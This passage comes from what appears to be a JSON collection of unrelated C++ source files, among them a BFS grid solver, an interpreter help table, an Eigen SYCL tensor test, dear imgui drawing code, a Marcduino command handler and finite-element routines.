0)\n\t\t{\n\t\t\tstd::cout << \"Paths simulated: \" << i + 1 << std::endl;\n\t\t}\n\t}\n\n\treturn paths;\n}\n\n",
    "#include <iostream>\n#include <queue>\nint arr[20][20];\nint dx[4]={1,-1,0,0};\nint dy[4]={0,0,1,-1};\n#define X first \n#define Y second\nint dist[20][20];\nusing namespace std;\nint Max=0;\nint n,m;\n\nint bfs(int i,int j,int k) {\n    int num=0;\n    for(int i=0;i<n;i++) {\n        for(int j=0;j<n;j++) {\n            dist[i][j]=-1;\n        }\n    }\n    queue<pair<int,int>> q;\n    q.push({i,j});\n    dist[i][j]=0;\n    if(arr[i][j]==1) num++;\n    while(!q.empty()) {\n        pair<int,int> cur=q.front();\n        q.pop();\n        if(dist[cur.X][cur.Y]==k)break;\n        for(int idx=0;idx<4;idx++) {\n            int nx=cur.X+dx[idx];\n            int ny=cur.Y+dy[idx];\n            if(nx<0||nx>=n||ny<0||ny>=n) continue;\n            if(dist[nx][ny]!=-1) continue;\n            if(arr[nx][ny]==1) {\n                num++;\n            }\n            q.push({nx,ny});\n            dist[nx][ny]=dist[cur.X][cur.Y]+1;\n\n        }\n    }\n    return num; //num: \ucc44\uad74\ud55c \uae08 \uac1c\uc218\n}\n\nint main() {\n    // \uc5ec\uae30\uc5d0 \ucf54\ub4dc\ub97c \uc791\uc131\ud574\uc8fc\uc138\uc694.\n    cin>>n>>m;\n    int cnt=0;\n    for(int i=0;i<n;i++) {\n        for(int j=0;j<n;j++) {\n            cin>>arr[i][j];\n            if(arr[i][j]==1) cnt++;\n        }\n    }\n    // int money=cnt*m;\n\n    for(int i=0;i<n;i++) {\n        for(int j=0;j<n;j++) {\n            int k=2*(n-1);\n            while(k>=0) {\n                int cost=k*k+(k+1)*(k+1);\n                int num=bfs(i,j,k--);\n                int res=num*m-cost;\n                if(res>=0) {\n                    Max=max(num,Max);\n                    break;\n                }\n            }\n        }\n    }\n    cout<<Max;\n    return 0;\n}",
    "#include \"help.h\"\n\n#include \"assertions.h\"\n#include \"constants.h\"\n#include \"error.h\"\n\n#include <sys/ioctl.h>\n#include <algorithm>\n#include <cctype>\n#include <iostream>\n#include <mutex>\n#include <string>\n#include <vector>\n\n// TODO: fix bad description\n\nOperation::Operation() {\n    args_.push_back(\"Name\");\n    args_.push_back(\"ArgCnt\");\n    args_.push_back(\"Example = Result\");\n    args_.push_back(\"Description\");\n    ASSERT(args_.size() == kOpArgs,\n           (\"Operations should holds \" + std::to_string(kOpArgs) + \" fields\").data());\n}\n\nOperation::Operation(const std::string& name, const std::string& example,\n                     const std::string& arg_cnt, const std::string& description) {\n    args_.push_back(name);\n    args_.push_back(arg_cnt);\n    args_.push_back(example);\n    args_.push_back(description);\n    ASSERT(args_.size() == kOpArgs,\n           (\"Operations should holds \" + std::to_string(kOpArgs) + \" fields\").data());\n}\n\nbool Operation::operator<(const Operation& other) {\n    return args_[0] < other.args_[0];\n}\n\nvoid BeautyHelp::AddOperation() {\n    operations_.push_back(Operation());\n    size_t id = 0;\n    for (auto str : operations_.back().args_) {\n        sizes_[id] = std::max(sizes_[id], str.size());\n        ++id;\n    }\n}\n\nvoid BeautyHelp::AddOperation(const std::string& name, const std::string& example,\n                              const std::string& arg_cnt, const std::string& description) {\n    operations_.push_back(Operation(name, example, arg_cnt, description));\n    size_t id = 0;\n    for (auto str : operations_.back().args_) {\n        sizes_[id] = std::max(sizes_[id], str.size());\n        ++id;\n    }\n}\n\nstd::string BeautyHelp::GetHelp() {\n    std::string ans;\n    ans += kDelim;\n    for (auto op : operations_) {\n        ans += kTab;\n        size_t id = 0;\n        for (auto str : op.args_) {\n            ans += str;\n            if (id + 1 != Operation::kOpArgs) {\n                ans += std::string(sizes_[id] - str.size() + 2, ' ');\n            }\n            ++id;\n        }\n        ans += '\\n';\n        ans += kDelim;\n    }\n    return ans;\n}\n\nBeautyHelp::BeautyHelp() {\n    sizes_.assign(Operation::kOpArgs, 0);\n\n    AddOperation();\n    AddOperation(kQuote, \"(quote (1 2 3)) = (1 2 3)\", \"1\",\n                 \"Returs argument. Short form: (quote 5) = \\'5 = 5\");\n    AddOperation(kAbs, \"(abs -2) = 2\", \"1\", \"Returns absolute value\");\n    AddOperation(kIsNumber, \"(number? (1 . 2)) = #f\", \"1\",\n                 \"Returns \\'#t\\' if argument is number, \\'#f\\' otherwise\");\n    AddOperation(kIsBool, \"(boolean? #f) = #t\", \"1\",\n                 \"Returns \\'#t\\' if argument is boolean, \\'#f\\' otherwise\");\n    AddOperation(kNot, \"(not #t) = #f\", \"1\", \"Returns \\'#f\\' if \\'#t\\' given, \\'#t\\' otherwise\");\n    AddOperation(kIsPair, \"(pair? (1 . 2)) = #t\", \"1\",\n                 \"Returns \\'#t\\' if argument is a pair, \\'#f\\' otherwise\");\n    AddOperation(kIsNull, \"(null? ()) = #t\", \"1\",\n                 \"Returns \\'#t\\' if argument is a null (empty list), \\'#f\\' otherwise\");\n    AddOperation(kIsList, \"(list? (1 2 3 . 4)) = #t\", \"1\",\n                 \"Returns \\'#t\\' if argument is a list, \\'#f\\' otherwise\");\n    AddOperation(kCar, \"(car (1 2 3)) = 1\", \"1\", \"Returns first element of list\");\n    AddOperation(kCdr, \"(cdr (1 2 3)) = (2 3)\", \"1\", \"Returns list without first element\");\n    AddOperation(kIsSymbol, \"(symbol? abacaba) = #t\", \"1\",\n                 \"Returns \\'#t\\' if argument is a symbol, \\'#f\\' otherwise\");\n    AddOperation(kEqual, \"(= 2 2 (+ 1 1)) = #t\", \"0+\",\n                 \"Returns \\'#t\\' if all arguments are equal, \\'#f\\' otherwise\");\n    AddOperation(kLess, \"(< 1 2 3) = #t\", \"0+\",\n                 \"Returns \\'#t\\' if sequence of arguments are increasing, \\'#f\\' otherwise\");\n    AddOperation(kGreater, \"(> 3 2 1) = #t\", \"0+\",\n                 \"Returns \\'#t\\' if sequence of arguments are decreasing, \\'#f\\' otherwise\");\n    AddOperation(kLEqual, \"(<= 1 1 2) = #t\", \"0+\",\n                 \"Returns \\'#t\\' if sequence of arguments are not decreasing, \\'#f\\' otherwise\");\n    AddOperation(kGEqual, \"(>= 2 1 1) = #t\", \"0+\",\n                 \"Returns \\'#t\\' if sequence of arguments are not increasing, \\'#f\\' otherwise\");\n    AddOperation(kPlus, \"(+ 1 2 3) = 6\", \"0+\",\n                 \"Returns the sum of the elements of a sequence. Note: (+) = 0\");\n    AddOperation(kMultiply, \"(* 2 3 4) = 24\", \"0+\",\n                 \"Returns the product of the elements of a sequence. Note: (*) = 1\");\n    AddOperation(kDivide, \"(/ 14 2 2) = 3\", \"1+\",\n                 \"Returns sequential division of the elements of a sequence. Note: (/ 5) = 5\");\n    AddOperation(kMinus, \"(- 9 7 5) = -3\", \"2+\",\n                 \"Returns sequential subtraction of the elements of a sequence. Note: (- 3) = -3\");\n    AddOperation(kMax, \"(max 1 2 3) = 3\", \"1+\",\n                 \"Returns the maximum of the elements of a sequence\");\n    AddOperation(kMin, \"(min 1 2 3) = 1\", \"1+\",\n                 \"Returns the minimum of the elements of a sequence\");\n    AddOperatio",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2015\n// Mehdi Goli    Codeplay Software Ltd.\n// Ralph Potter  Codeplay Software Ltd.\n// Luke Iwanski  Codeplay Software Ltd.\n// Contact: <eigen@codeplay.com>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#define EIGEN_TEST_NO_LONGDOUBLE\n#define EIGEN_TEST_NO_COMPLEX\n\n#define EIGEN_DEFAULT_DENSE_INDEX_TYPE int64_t\n#define EIGEN_USE_SYCL\n\n#include \"main.h\"\n#include <unsupported/Eigen/CXX11/Tensor>\n\n\ntemplate <typename DataType, int DataLayout, typename IndexType>\nstatic void test_simple_reverse(const Eigen::SyclDevice&  sycl_device) {\n\n  IndexType dim1 = 2;\n  IndexType dim2 = 3;\n  IndexType dim3 = 5;\n  IndexType dim4 = 7;\n\n  array<IndexType, 4> tensorRange = {{dim1, dim2, dim3, dim4}};\n  Tensor<DataType, 4, DataLayout, IndexType> tensor(tensorRange);\n  Tensor<DataType, 4, DataLayout, IndexType> reversed_tensor(tensorRange);\n  tensor.setRandom();\n\n  array<bool, 4> dim_rev;\n  dim_rev[0] = false;\n  dim_rev[1] = true;\n  dim_rev[2] = true;\n  dim_rev[3] = false;\n\n  DataType* gpu_in_data = static_cast<DataType*>(sycl_device.allocate(tensor.dimensions().TotalSize()*sizeof(DataType)));\n  DataType* gpu_out_data =static_cast<DataType*>(sycl_device.allocate(reversed_tensor.dimensions().TotalSize()*sizeof(DataType)));\n\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType> >  in_gpu(gpu_in_data, tensorRange);\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType> >  out_gpu(gpu_out_data, tensorRange);\n\n  sycl_device.memcpyHostToDevice(gpu_in_data, tensor.data(),(tensor.dimensions().TotalSize())*sizeof(DataType));\n  out_gpu.device(sycl_device) = in_gpu.reverse(dim_rev);\n  sycl_device.memcpyDeviceToHost(reversed_tensor.data(), gpu_out_data, reversed_tensor.dimensions().TotalSize()*sizeof(DataType));\n  // Check that the CPU and GPU reductions return the same result.\n  for (IndexType i = 0; i < 2; ++i) {\n    for (IndexType j = 0; j < 3; ++j) {\n      for (IndexType k = 0; k < 5; ++k) {\n        for (IndexType l = 0; l < 7; ++l) {\n          VERIFY_IS_EQUAL(tensor(i,j,k,l), reversed_tensor(i,2-j,4-k,l));\n        }\n      }\n    }\n  }\n  dim_rev[0] = true;\n  dim_rev[1] = false;\n  dim_rev[2] = false;\n  dim_rev[3] = false;\n\n  out_gpu.device(sycl_device) = in_gpu.reverse(dim_rev);\n  sycl_device.memcpyDeviceToHost(reversed_tensor.data(), gpu_out_data, reversed_tensor.dimensions().TotalSize()*sizeof(DataType));\n\n  for (IndexType i = 0; i < 2; ++i) {\n    for (IndexType j = 0; j < 3; ++j) {\n      for (IndexType k = 0; k < 5; ++k) {\n        for (IndexType l = 0; l < 7; ++l) {\n          VERIFY_IS_EQUAL(tensor(i,j,k,l), reversed_tensor(1-i,j,k,l));\n        }\n      }\n    }\n  }\n\n  dim_rev[0] = true;\n  dim_rev[1] = false;\n  dim_rev[2] = false;\n  dim_rev[3] = true;\n  out_gpu.device(sycl_device) = in_gpu.reverse(dim_rev);\n  sycl_device.memcpyDeviceToHost(reversed_tensor.data(), gpu_out_data, reversed_tensor.dimensions().TotalSize()*sizeof(DataType));\n\n  for (IndexType i = 0; i < 2; ++i) {\n    for (IndexType j = 0; j < 3; ++j) {\n      for (IndexType k = 0; k < 5; ++k) {\n        for (IndexType l = 0; l < 7; ++l) {\n          VERIFY_IS_EQUAL(tensor(i,j,k,l), reversed_tensor(1-i,j,k,6-l));\n        }\n      }\n    }\n  }\n\n  sycl_device.deallocate(gpu_in_data);\n  sycl_device.deallocate(gpu_out_data);\n}\n\n\n\ntemplate <typename DataType, int DataLayout, typename IndexType>\nstatic void test_expr_reverse(const Eigen::SyclDevice&  sycl_device, bool LValue)\n{\n  IndexType dim1 = 2;\n  IndexType dim2 = 3;\n  IndexType dim3 = 5;\n  IndexType dim4 = 7;\n\n  array<IndexType, 4> tensorRange = {{dim1, dim2, dim3, dim4}};\n  Tensor<DataType, 4, DataLayout, IndexType> tensor(tensorRange);\n  Tensor<DataType, 4, DataLayout, IndexType> expected(tensorRange);\n  Tensor<DataType, 4, DataLayout, IndexType> result(tensorRange);\n  tensor.setRandom();\n\n  array<bool, 4> dim_rev;\n  dim_rev[0] = false;\n  dim_rev[1] = true;\n  dim_rev[2] = false;\n  dim_rev[3] = true;\n\n  DataType* gpu_in_data = static_cast<DataType*>(sycl_device.allocate(tensor.dimensions().TotalSize()*sizeof(DataType)));\n  DataType* gpu_out_data_expected =static_cast<DataType*>(sycl_device.allocate(expected.dimensions().TotalSize()*sizeof(DataType)));\n  DataType* gpu_out_data_result =static_cast<DataType*>(sycl_device.allocate(result.dimensions().TotalSize()*sizeof(DataType)));\n\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType> >  in_gpu(gpu_in_data, tensorRange);\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType> >  out_gpu_expected(gpu_out_data_expected, tensorRange);\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType> >  out_gpu_result(gpu_out_data_result, tensorRange);\n\n\n  sycl_device.memcpyHostToDevice(gpu_in_data, tensor.data(),(tensor.dimensions().TotalSize())*sizeof(DataType));\n\n  if (LValue) {\n    out_gpu_expected.reverse(dim_rev).device(sycl_de",
    "// dear imgui, v1.90.5\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImTriangulator, ImDrawList concave polygon fill\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n// [SECTION] STB libraries implementation (for stb_truetype and stb_rect_pack)\n//------------------------------------------------------",
    "\n// // #include \"ReelTwoHandler.h\"\n\n\n// // bool handleMarcduinoAction(const char* action)\n// // {\n// //     String LD_text = \"\";\n// //     bool panelTypeSelected = false;\n// //     char buffer[1024];\n// //     snprintf(buffer, sizeof(buffer), \"%s\", action);\n// //     char* cmd = buffer;\n// //     // if (*cmd == '#')\n// //     // {\n// //     //     // Std Marcduino Function Call Configured\n// //     //     uint32_t seq = strtolu(cmd+1, &cmd);\n// //     //     if (*cmd == '\\0')\n// //     //     {\n// //     //         if (seq >= 1 && seq <= SizeOfArray(DEFAULT_MARCDUINO_COMMANDS))\n// //     //         {\n// //     //             // If the commands starts with \"BM\" we direct it to the body marc controller\n// //     //             const char* marcCommand = DEFAULT_MARCDUINO_COMMANDS[seq-1];\n// //     //             if (marcCommand[0] == 'B' && marcCommand[1] == 'M')\n// //     //             {\n// //     //                 sendBodyMarcCommand(&marcCommand[2]);\n// //     //             }\n// //     //             else\n// //     //             {\n// //     //                 // Otherwise we send it to the dome Marcduino\n// //     //                 sendMarcCommand(marcCommand);\n// //     //             }\n// //     //             return true;\n// //     //         }\n// //     //         else\n// //     //         {\n// //     //             SHADOW_DEBUG(\"Marcduino sequence range is 1-%d in action command \\\"%s\\\"\\n\", SizeOfArray(DEFAULT_MARCDUINO_COMMANDS), action)\n// //     //             return false;\n// //     //         }\n// //     //     }\n// //     //     SHADOW_DEBUG(\"Excepting number after # in action command \\\"%s\\\"\\n\", action)\n// //     //     return false;\n// //     // }\n// //     for (;;)\n// //     {\n// //         char buf[100];\n// //         if (*cmd == '\"')\n// //         {\n// //             // Skip the quote\n// //             cmd++;\n// //             char* marcCommand = cmd;\n// //             char* nextCmd = strchr(cmd, ',');\n// //             if (nextCmd != nullptr)\n// //             {\n// //                 size_t len = nextCmd - marcCommand;\n// //                 strncpy(buf, marcCommand, len);\n// //                 buf[len] = '\\0';\n// //                 cmd = nextCmd;\n// //                 marcCommand = buf;\n// //             }\n// //             else\n// //             {\n// //                 cmd += strlen(marcCommand);\n// //             }\n// //             // If the commands starts with \"BM\" we direct it to the body marc controller\n// //             if (marcCommand[0] == 'B' && marcCommand[1] == 'M')\n// //             {\n// //                 sendBodyMarcCommand(&marcCommand[2]);\n// //             }\n// //             else\n// //             {\n// //                 sendMarcCommand(marcCommand);\n// //             }\n// //         }\n// //         else if (*cmd == '$')\n// //         {\n// //             char* mp3Cmd = cmd;\n// //             char* nextCmd = strchr(cmd, ',');\n// //             if (nextCmd != nullptr)\n// //             {\n// //                 size_t len = nextCmd - mp3Cmd;\n// //                 strncpy(buf, mp3Cmd, len);\n// //                 buf[len] = '\\0';\n// //                 cmd = nextCmd;\n// //                 mp3Cmd = buf;\n// //             }\n// //             else\n// //             {\n// //                 cmd += strlen(mp3Cmd);\n// //             }\n// //             sendMarcCommand(mp3Cmd);\n// //         }\n// //         else if (startswith(cmd, \"MP3=\"))\n// //         {\n// //             char* mp3Cmd = cmd;\n// //             char* nextCmd = strchr(cmd, ',');\n// //             if (nextCmd != nullptr)\n// //             {\n// //                 size_t len = nextCmd - mp3Cmd;\n// //                 buf[0] = '$';\n// //                 strncpy(&buf[1], mp3Cmd, len);\n// //                 buf[len+1] = '\\0';\n// //                 cmd = nextCmd;\n// //                 mp3Cmd = buf;\n// //             }\n// //             else\n// //             {\n// //                 cmd += strlen(mp3Cmd);\n// //             }\n// //             sendMarcCommand(mp3Cmd);\n// //         }\n// //         else if (startswith(cmd, \"Panel=M\"))\n// //         {\n// //             static const char* sCommands[] = {\n// //                 \":CL00\",\n// //                 \":SE51\",\n// //                 \":SE52\",\n// //                 \":SE53\",\n// //                 \":SE54\",\n// //                 \":SE55\",\n// //                 \":SE56\",\n// //                 \":SE57\"\n// //             };\n// //             uint32_t num = strtolu(cmd, &cmd);\n// //             if (num >= 1 && num <= SizeOfArray(sCommands))\n// //             {\n// //                 if (num > 1)\n// //                 {\n// //                     sendMarcCommand(\":CL00\");  // close all the panels prior to next custom routine\n// //                     delay(50); // give panel close command time to process before starting next panel command \n// //                 }\n// //                 sendMarcCommand(sCommands[num-1]);\n// //                 panelTypeSelected = true;\n// //             }\n// /",
    "/* TO COMPILE:\n g++ *.cpp *.h -o ./output.exe\n \n */\n#include<vector>\n#include<cmath>\n#include<iostream>\n#include<eigen3/Eigen/Dense>\n#include<fstream>\n\n#define f long double\n\n#define DIRICHLET 0\n#define NEUMANN 1\n\n#define EPSLON 0.0001\n\n\nusing namespace std;\nusing namespace Eigen;\n\nstruct contourCondition\n{\n    f value;\n    int type;\n};\n\ncontourCondition create_contourCondition(f value, int type)\n{\n    contourCondition cc;\n    cc.value = value;\n    cc.type = type;\n    return cc;\n}\n\nf constante_1(f x)\n{\n    return 1; \n}\n\nf pi2sinPiX(f x)\n{\n    return M_PI*M_PI*sin(M_PI*x);\n}\n\nf sinpix(f x)\n{\n    return sin(M_PI * x);\n}\n\nf picospix(f x)\n{\n    return M_PI*cos(M_PI*x);\n}\n\nf mpicospix(f x)\n{\n    return - M_PI*cos(M_PI*x);\n}\nf solexata2q(f x)\n{\n    f epslon = EPSLON; \n    f c2 = (pow(M_E, -1.0/sqrt(epslon)) - 1.0)/(pow(M_E, 1.0/sqrt(epslon)) - pow(M_E, -1.0/sqrt(epslon)));\n    f c1 = - 1.0 - c2;\n    return c1*pow(M_E, -x/sqrt(epslon)) + c2*pow(M_E, x/sqrt(epslon)) + 1.0;\n}\n\nvoid printvector(vector<f> v)\n{\n    for(int i = 0; i<v.size(); i++)\n    {\n        cout<<v[i]<<\",\";\n    }\n    cout<<endl;\n}\n\nvoid printmatrix(MatrixXd m)\n{\n    ofstream file(\"matrix.csv\");\n    if(!file)\n    {\n        cerr<<\"Erro ao abrir arquivo de sa\u00edda\"<<endl;\n        return;\n    }\n    file<<m<<endl;\n}\n\n\nvector<f> gauss_weights(int nint)\n{\n    vector<f> w(nint, 0);\n    switch (nint)\n    {\n    case 2:\n        w[0] = 1.0;\n        w[1] = 1.0;\n        break;\n\n    case 3:\n        w[0] = 5/9.0;\n        w[1] = 8/9.0;\n        w[2] = 5/9.0;\n        break;\n    \n    case 4:\n        w[0] = (18.0 - sqrt(30.0))/36.0;\n        w[1] = (18.0 + sqrt(30.0))/36.0;\n        w[2] = (18.0 + sqrt(30.0))/36.0;\n        w[3] = (18.0 - sqrt(30.0))/36.0;\n        break;\n    \n    case 5:\n        w[0] = (322 - 13*sqrt(70))/900.0;\n        w[1] = (322 + 13*sqrt(70))/900.0;\n        w[2] = 128.0/225.0;\n        w[3] = (322 + 13*sqrt(70))/900.0;\n        w[4] = (322 - 13*sqrt(70))/900.0;\n        break;\n\n    default:\n        cout<<\"gauss_weights error: n\u00e3o implementei esse n\u00famero de pontos de integra\u00e7\u00e3o ainda\"<<endl;\n        break;\n    }\n    return w;\n}\n\nf*** create_shg(int nen, int nint)\n{\n    f*** shg = new f**[2];\n    shg[0] = new f*[nen];\n    shg[1] =  new f*[nen];\n\n    vector<f> pt;\n    switch (nint)\n    {\n    case 2:\n        pt.push_back(-1/sqrt(3.0));\n        pt.push_back(1/sqrt(3.0));\n        break;\n    \n    case 3:\n        pt.push_back(-sqrt(3.0/5.0));\n        pt.push_back(0.0);\n        pt.push_back(sqrt(3.0/5.0));\n        break;\n    \n    case 4:\n        pt.push_back(-sqrt((3.0/7.0) + (2.0/7.0)*sqrt(6.0/5.0)));\n        pt.push_back(-sqrt((3.0/7) - (2.0/7.0)*sqrt(6.0/5.0)));\n        pt.push_back(sqrt((3.0/7) - (2.0/7.0)*sqrt(6.0/5.0)));\n        pt.push_back(sqrt((3.0/7) + (2.0/7.0)*sqrt(6.0/5.0)));\n        break;\n\n    case 5:\n        pt.push_back((-1.0/3.0)*sqrt(5.0 +  2.0*sqrt(10.0/7.0)));\n        pt.push_back((-1.0/3.0)*sqrt(5.0 -  2.0*sqrt(10.0/7.0)));\n        pt.push_back(0.0);\n        pt.push_back((1.0/3.0)*sqrt(5.0 -  2.0*sqrt(10.0/7.0)));\n        pt.push_back((1.0/3.0)*sqrt(5.0 +  2.0*sqrt(10.0/7.0)));\n        break;\n\n    default:\n        cout<<\"shg error: n\u00e3o implementei esse n\u00famero de pontos de integra\u00e7\u00e3o ainda\"<<endl;\n\n        break;\n    }\n\n    \n    for(int j=0;j<nen; j++)\n    {\n        shg[0][j] = new f[nint];\n        shg[1][j] = new f[nint];\n    }\n    \n    //Preenchimento do shg\n    for(int l = 0; l<nint; l++)\n    {\n        f t = pt[l];\n        switch (nen)\n        {\n        case 2: \n            shg[0][0][l] = (1.0 - t)/2.0;\n            shg[0][1][l] = (1.0 + t)/2.0;\n            shg[1][0][l] = -1.0/2.0;\n            shg[1][1][l] = 1.0/2.0;\n            break;\n        \n        case 3:               \n            shg[0][0][l] = (1/2.0)*t*(t-1.0);\n            shg[0][1][l] = -((t-1.0)*(t+1.0));\n            shg[0][2][l] = (1/2.0)*t*(t+1);\n            shg[1][0][l] = (2.0*t - 1)/2.0;\n            shg[1][1][l] = -(2.0*t);\n            shg[1][2][l] = (2.0*t + 1)/2.0;\n            break;\n\n        case 4:\n            shg[0][0][l] = -(9.0/16.0)*(t + 1.0/3.0)*(t - 1.0/3.0)*(t-1.0);\n            shg[0][1][l] = (27.0/16.0)*(t + 1)*(t - 1.0/3.0)* (t-1);\n            shg[0][2][l] =  -(27.0/16.0)*(t + 1.0)*(t+ 1.0/3.0)*(t - 1.0);\n            shg[0][3][l] = (9.0/16.0)*(t + 1.0)*(t+1.0/3.0)*(t - 1.0/3.0);\n\n            shg[1][0][l] = -(9.0/16.0)*(3.0*pow(t,2) - 2.0*t - 1.0/9.0);\n            shg[1][1][l] = (27.0/16.0)*(3.0*pow(t, 2) - 2.0*t/3.0 - 1);\n            shg[1][2][l] =  (-27.0/16.0)*(3.0*pow(t, 2) + 2.0*t/3.0 -1);\n            shg[1][3][l] =  (9.0/16.0) * (3.0*pow(t, 2) + 2.0*t - 1.0/9.0);\n            break;\n\n        case 5:\n            shg[0][0][l] = (t + (1.0/2.0))*t*(t - (1.0/2.0))*(t - 1.0)*(2.0/3.0);\n            shg[0][1][l] = (t + 1.0)*t*(t - (1.0/2.0))*(t - 1.0)*(-8.0/3.0);\n            shg[0][2][l] =  (t + 1.0)*(t + (1.0/2.0))*(t - (1.0/2.0))*(t - 1.0)*4.0;\n            shg[0][3][l] = (t + 1.0)*(t + (1.0/2.0))*t*(t - 1.0)*(-8.0/3.0);\n            shg[0][4][l] = (t + 1.0)*(t + (1.0/2",
    "#include \"matrix.h\"\n#include <iostream>\n#include <vector>\n#include <thread>\nmatrix::matrix(const std::vector<std::vector<float>>& init) : data(init) {\n\tif (init.size() > 0) { //check for empty array\n\t\tint rowS = init.size();\n\t\tthis->rowCount = rowS;\n\t\tthis->columnCount = init[0].size();\n\t\tif (rowS < 1) {\n\t\t\tthrow std::invalid_argument(\"Empty Matrix\");\n\t\t}\n\t\n\t\tfor (int row = 0; row < init.size(); row++) {\n\t\t\tif (!(init[row].size() == columnCount)) { //check for row with different sizes\n\t\t\t\tthrow std::invalid_argument(\"Inconsistence row size\");\n\t\t\t}\n\t\t}\n\t\n\t}\n\telse {\n\t\tthrow std::invalid_argument(\"Empty matrix\");\n\t}\n}\n\nmatrix::matrix(int r, int c) : rowCount(r), columnCount(c) {\n\tdata.reserve(rowCount);\n\tfor (int row = 0; row < r; row++) {\n\t\tdata.emplace_back();\n\t\tdata[row].reserve(row);\n\t\tfor (int column = 0; column < c; column++) {\n\t\t\tdata[row].emplace_back();\n\t\t}\n\t}\n}\n\nmatrix matrix::operator+(const matrix& obj) {\n\tif (this->columnCount == obj.columnCount && this->rowCount == obj.rowCount) {\n\t\tmatrix newMatrix(this->rowCount, this->columnCount);\n\t\tfor (int column = 0; column < this->columnCount; column++) {\n\t\t\tfor (int row = 0; row < obj.rowCount; row++) {\n\t\t\t\tnewMatrix.data[row][column] = data[row][column] + obj.data[row][column];\n\t\t\t}\n\t\t}\n\t\treturn newMatrix;\n\t}\n\telse {\n\t\tthrow std::invalid_argument(\"Mismatch matrix size\");\n\t}\n}\n\nmatrix matrix::operator-(const matrix& obj) {\n\tif (this->columnCount == obj.columnCount && this->rowCount == obj.rowCount) {\n\t\tmatrix newMatrix(this->rowCount, this->columnCount);\n\t\tfor (int column = 0; column < obj.columnCount; column++) {\n\t\t\tfor (int row = 0; row < obj.rowCount; row++) {\n\t\t\t\tnewMatrix.data[row][column] = data[row][column] - obj.data[row][column];\n\t\t\t}\n\t\t}\n\t\treturn newMatrix;\n\t}\n\telse {\n\t\tthrow std::invalid_argument(\"Mismatch matrix size\");\n\t}\n}\n\nmatrix 